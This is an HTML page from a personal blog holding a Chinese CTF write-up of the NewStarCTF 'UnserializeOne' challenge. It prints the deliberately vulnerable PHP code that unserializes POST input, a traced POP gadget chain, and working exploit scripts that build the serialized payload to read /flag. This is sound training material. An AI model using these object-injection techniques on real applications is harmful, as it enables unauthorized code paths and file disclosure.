@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>NSWSTAR-week2-UnserializeOne | 章小豫的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="写这个反序列化题目，学到了几点 121，__clone()魔法函数的触发方法以及一些细节2，反序列化中属性的私有以及保护的处理方法  直接看题目， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phperror_repor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSWSTAR-week2-UnserializeOne">
+<meta property="og:url" content="http://example.com/2022/10/19/NSWSTAR-week2-UnserializeOne/index.html">
+<meta property="og:site_name" content="章小豫的博客">
+<meta property="og:description" content="写这个反序列化题目，学到了几点 121，__clone()魔法函数的触发方法以及一些细节2，反序列化中属性的私有以及保护的处理方法  直接看题目， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phperror_repor">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/10/19/NSWSTAR-week2-UnserializeOne/0.png">
+<meta property="og:image" content="http://example.com/2022/10/19/NSWSTAR-week2-UnserializeOne/3.png">
+<meta property="og:image" content="http://example.com/2022/10/19/NSWSTAR-week2-UnserializeOne/4.png">
+<meta property="article:published_time" content="2022-10-19T10:59:22.000Z">
+<meta property="article:modified_time" content="2022-10-20T00:31:20.785Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/10/19/NSWSTAR-week2-UnserializeOne/0.png">
+  
+    <link rel="alternate" href="/atom.xml" title="章小豫的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">章小豫的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-NSWSTAR-week2-UnserializeOne" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/" class="article-date">
+  <time class="dt-published" datetime="2022-10-19T10:59:22.000Z" itemprop="datePublished">2022-10-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      NSWSTAR-week2-UnserializeOne
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>写这个反序列化题目，学到了几点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1，__clone()魔法函数的触发方法以及一些细节</span><br><span class="line">2，反序列化中属性的私有以及保护的处理方法</span><br></pre></td></tr></table></figure>
+
+<p>直接看题目，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析一波，确定了基本pop链，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start:__destruct==&gt;Sec::__toString==&gt;Easy::__call==&gt;eeee::__clone==&gt;Start::__isset==&gt;Sec::__invoke</span><br></pre></td></tr></table></figure>
+
+<p>更详细的pop链，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Start::__destruct()@$this-&gt;name=$sec   -&gt;   $Sec::__toString()@$this-&gt;obj=$easy   -&gt;   $Easy::__call()@$this-&gt;cla=$copy_eee&amp;$var[0]=$eee   -&gt;   $eee::__clone()@($this-&gt;obj)=($start)   -&gt;   $Start::__isset()@$this-&gt;func=$sec   -&gt;   sec::__invoke()</span><br></pre></td></tr></table></figure>
+
+<p>接下来编写poc，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$ee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$ee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="variable">$easy</span>-&gt;cla=<span class="variable">$copy_ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>[<span class="number">0</span>]=<span class="variable">$ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>运行，发现php报错，</p>
+<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/0.png"></p>
+<p>然后搞了好久也没找到解决方法，又检查了好几遍pop链，感觉pop链没错，一时间不知道怎么做了。</p>
+<p>直到writeup出来😶😶……</p>
+<p>最后看了一下writeup，发现构造的pop链是正确的，只是构造过程中几个细节没有处理好，导致php出错。</p>
+<p>重新编写的poc，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$func</span>;<span class="comment">//protected变为public，具体为什么这样修改，现在还不太清楚</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$obj</span>;<span class="comment">// private变为public</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$var</span>;<span class="comment">// private变为public</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$ee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$ee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="comment">//$easy-&gt;cla=$copy_ee;</span></span><br><span class="line"><span class="comment">//$sec-&gt;var[0]=$ee;修改为var，去掉数组[]。为什么这样修改，我暂时还不太清楚，以后了解了，会回来更新的</span></span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>=<span class="variable">$ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>其中，为什么<code>$easy-&gt;cla=$copy_ee;</code>删除掉，我的理解是要想让eeee类中__clone()函数触发，只需要eeee类被克隆就OK了，就是让Easy类中的$var&#x3D;$eeee类，而不用再定义Easy中的cla属性。</p>
+<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/3.png"></p>
+<p>最后，编写的exp可以运行，传入后得到flag</p>
+<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/4.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/10/19/NSWSTAR-week2-UnserializeOne/" data-id="cl9hxjpfv001378v4b9ld3scs" data-title="NSWSTAR-week2-UnserializeOne" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          由NSSCTF-SWPUCTF-ez_ez_unserialize，对反序列具体详细过程以及对__construct，__destruct函数执行情况的具体分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">NSSCTF-HNCTF-[Week1]Challenge__rce</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/">由NSSCTF-SWPUCTF-ez_ez_unserialize，对反序列具体详细过程以及对__construct，__destruct函数执行情况的具体分析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/">NSWSTAR-week2-UnserializeOne</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/">NSSCTF-HNCTF-[Week1]Challenge__rce</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">CTFHUB-SSRF-端口扫描</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/">CTFHUB-SSRF-伪协议读取文件</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
